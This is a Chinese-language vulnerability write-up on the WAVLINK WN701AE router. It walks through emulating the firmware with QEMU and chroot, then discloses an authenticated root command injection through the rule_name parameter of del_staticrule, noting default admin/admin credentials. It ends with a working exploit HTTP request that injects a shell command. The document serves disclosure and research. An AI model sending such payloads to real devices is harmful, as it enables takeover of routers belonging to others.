# 固件模拟

**日期**：2026-08-07
**目标**：`/home/iotsec-zone/Desktop/squashfs-root`（VM 192.168.2.227）
**固件**：WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin（MT7621 路由器）

---

## 二、Web 服务启动架构（三层）

### 启动链路

```
开机 → /etc/inittab → ::sysinit:/etc/init.d/rcS S boot → 按 START 序号执行 /etc/rc.d/S*
  ├─ S20network    → 网络就绪后拉起 /usr/bin/monitor（mesh 守护进程）
  ├─ S50uhttpd     → 配置残留（listen :81，docroot /www_luci2 不存在）→ 实际无效
  └─ S99lighttpd   → lighttpd 前端 :80 + :443（docroot /etc/lighttpd/www）

monitor → 调用 bin/monitor_process.sh 保活循环（acap_mode=ac 时生效）：
  lighttpd 死 → /etc/init.d/lighttpd restart
  ioos 死    → ioos&   （后端主 daemon，监听 127.0.0.1:81）
  mu 死      → mu&     （监听 :82，download.csp 后端）
  monitor 死 → monitor&（monitor 自守护）
```

**注意**：`/usr/sbin/wlink_acap_run.sh` 在 **mode=ap 时会停掉 lighttpd** —— 只有 AC 模式（acap.mode=ac）才有 web 服务。设备为 Mesh 路由器（MeshMode=0, OperationMode=0）时为 AC 模式。

### lighttpd mod_proxy 路由表（/etc/lighttpd/conf.d/30-proxy.conf）

| 前端 URL                                                     | 转发目标       | 后端         |
| ------------------------------------------------------------ | -------------- | ------------ |
| protocol.csp / system.csp / netip.csp / sysfirm.csp / index.csp / dldlink.csp / error.csp | 127.0.0.1:81   | **ioos**     |
| upload.csp                                                   | 127.0.0.1:9082 | ioos 附属    |
| download.csp                                                 | 127.0.0.1:82   | **mu**       |
| dlna.csp                                                     | 127.0.0.1:8200 | USB/媒体服务 |
| control.csp                                                  | 127.0.0.1:8201 | 同上         |
| p2p.csp                                                      | 127.0.0.1:8212 | 同上         |
| dropbox.csp                                                  | 127.0.0.1:8300 | 同上         |
| baidupcs.csp                                                 | 127.0.0.1:8400 | 同上         |
| vpn.csp                                                      | 127.0.0.1:8500 | OpenVPN 服务 |

---

## 四、QEMU 系统模拟操作步骤（qemu-system）

### 前置资源（VM 192.168.2.227 已具备）

```
/home/iotsec-zone/Tools/qemu-images/mipsel/
├── debian_wheezy_mipsel_standard.qcow2   # 原生 mipsel Debian（root/root）
├── vmlinux-3.2.0-4-4kc-malta             # 内核
├── mipsel.sh / mipsel2.sh                # 参考启动脚本（tap0 模式）
/dev/net/tun                              # 可用
/usr/bin/qemu-system-mipsel               # 已安装
```

### 第 1 步：启动 debian-mipsel 系统（VM 上）

```bash
# 准备 tap 网络
sudo ip tuntap add dev tap0 mode tap user iotsec-zone
sudo ip link set tap0 up
sudo ip addr add 192.168.10.1/24 dev tap0

# 启动 QEMU（setsid 防 SSH 断线杀进程；日志落 /tmp/qemu_wn701ae.log）
sudo setsid qemu-system-mipsel \
    -M malta -cpu 74Kf \
    -kernel /home/iotsec-zone/Tools/qemu-images/mipsel/vmlinux-3.2.0-4-4kc-malta \
    -hda /home/iotsec-zone/Tools/qemu-images/mipsel/debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=ttyS0" \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \
    -nographic </dev/null >/tmp/qemu_wn701ae.log 2>&1 &
```

> **坑**：`-cpu 74Kf` 必须带（mt7621 属 74Kf 核心，同 WN579A3 教训）。
> **坑**：qcow2 内可能残留 WN579A3 旧 rootfs（`/root/squashfs-root`），有则先改名。

### 第 2 步：guest 内配置网络（root/root 登录）

```bash
ifconfig eth0 192.168.10.2/24 up
route add default gw 192.168.10.1
```

### 第 3 步：传输 rootfs（VM 上）

```bash
sudo tar -C /home/iotsec-zone/Desktop/squashfs-root -czf /tmp/wn701ae_rootfs.tar.gz .
scp /tmp/wn701ae_rootfs.tar.gz root@192.168.10.2:/root/
```

### 第 4 步：guest 内解包 + chroot 启动 web（核心）

```bash
R=/root/squashfs-root
mkdir -p $R
tar -xzf /root/wn701ae_rootfs.tar.gz -C $R

mount -o bind /dev $R/dev
mount -t proc /proc $R/proc
mount -t sysfs sysfs $R/sys

# guest 为原生 mipsel —— 直接 chroot 跑固件二进制，无需 qemu-user/binfmt
# ⚠ 先杀 monitor 保活进程（初始化流程拉起，PID 2887 之类）：
#   它会重复拉 mu / 触发 lighttpd restart 干扰手动管理 → 模拟环境必须 pkill
pkill monitor; pkill -f 'rc.common'
rm -f $R/tmp/ipc_path_mu              # 清旧 IPC socket，防止 mu 新旧实例冲突

# ⚠ 五守护进程缺一不可，严格按此顺序启动（每步间隔 2-3 秒，确保 IPC 就绪）：
#   ubusd  = OpenWrt IPC 总线，缺 → mu 85% CPU 死循环 "Failed to connect to ubus"（见"六、排障记录"）
#   nvramd = nvram 守护进程，缺 → wnvram_get 永久卡死，
#            lighttpd restart 脚本阻塞 → :80 起不来 → 网页打不开（见"六、排障记录"）
#   mu     = ioos 认证 IPC 后端（/tmp/ipc_path_mu），缺 → 登录一律 10001（见"六、排障记录"）
setsid chroot $R /bin/sh -c 'cd /; ./sbin/ubusd > /tmp/ubusd.out 2>&1 &'; sleep 2      # ① IPC 总线
setsid chroot $R /bin/sh -c 'cd /; ./usr/bin/nvramd > /tmp/nvramd.out 2>&1 &'; sleep 2 # ② nvram 守护
setsid chroot $R /bin/sh -c 'cd /; ./bin/mu > /tmp/mu.out 2>&1 &'; sleep 3             # ③ 认证后端
setsid chroot $R /bin/sh -c 'cd /; ./bin/ioos > /tmp/ioos.out 2>&1 &'; sleep 2         # ④ 后端 127.0.0.1:81
setsid chroot $R /bin/sh -c 'cd /; ./usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf > /tmp/lighttpd.out 2>&1 &'  # ⑤ 前端 :80/:443
```

> 若 rootfs 内 `/var` 仍指向 /dev/null（坏软链），先在 guest 修复：`chroot $R /bin/ln -sf /tmp /var`，并 `chroot $R /bin/mkdir -p /tmp/log/lighttpd /tmp/run`。
> **启动顺序**：nvramd → mu → ioos → lighttpd（nvramd/mu 先行，确保后续进程 IPC 可用）。
> **依赖检查**：`ls $R/tmp/ipc_path_mu` 应存在（srwxrwxrwx）；`ps | grep nvramd` 存活；mu 报 `get_mac_addr: ioctl fail` / `br-lan not found` 属正常（guest 无交换机/br-lan），不影响认证。





# WAVLINK WN701AE Router

-  Vendor: WAVLINK
-  Product: WL-WN701AE
-  Firmware Version: M01AE_V260105
-  Vulnerability Type:Authenticated Command Injection

# Description

WAVLINK WN701AE 固件（版本 WAVLINK-WN701AE-WO-M01AE_V260105-FM-BY.bin）ioos Web 后端存在命令注入漏洞。del_staticrule  未对 rule_name 参数过滤即拼接进 system() 执行的 static_route_setting.sh del "%s"命令，已认证攻击者（默认凭据 admin/admin）可通过注入任意系统命令实现 root 权限代码执行。

## Impact

利用 del_staticrule 漏洞命令注入漏洞在设备上以 root获取权限执行任意命令，从而完全控制路由器。可造成：窃取与篡改网络流量、修改固件配置实现持久化后门、发起内网横向渗透，或将大量设备纳入僵尸网络发起攻击。

## Vulnerability Details

在 del_staticrule函数 sub_40D868 中 ，在检测登录后，用户可控参数 rule_name ,在strcpy(v7, v4); --> 进入for循环 i = (const char *)strtok_r(v7, ";", v9) 对输入字符串用 '  ; ' 进行分割然后依次给到i ,然后通过 snprintf(v8, 256, "static_route_setting.sh del \"%s\"", i); ，最后通过system()执行导致命令注入

![image-20260807180431693](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260807180431693.png)

![image-20260807175039545](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260807175039545.png)

先模拟

![image-20260807182955585](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260807182955585.png)

**exp**

其中token需要登录获取

```http
GET /protocol.csp?fname=net&opt=del_staticrule&function=set&rule_name=aa%22%20%7C%20echo%20get_shell>%2Ftest%20%23&token=EC2882AD8F1AE344AFA5096E5B68E912 HTTP/1.1

Host: 192.168.10.3

If-Modified-Since: Fri, 07 Aug 2026 07:36:19 GMT

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

If-None-Match: "3407588632"

Accept: */*

Referer: http://192.168.10.3/html/index.html?v=1786094291914

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```

执行前

![image-20260807182743476](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260807182743476.png)

执行后

![image-20260807182758511](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260807182758511.png)

![image-20260807182812939](C:\Users\余雨波\AppData\Roaming\Typora\typora-user-images\image-20260807182812939.png)

















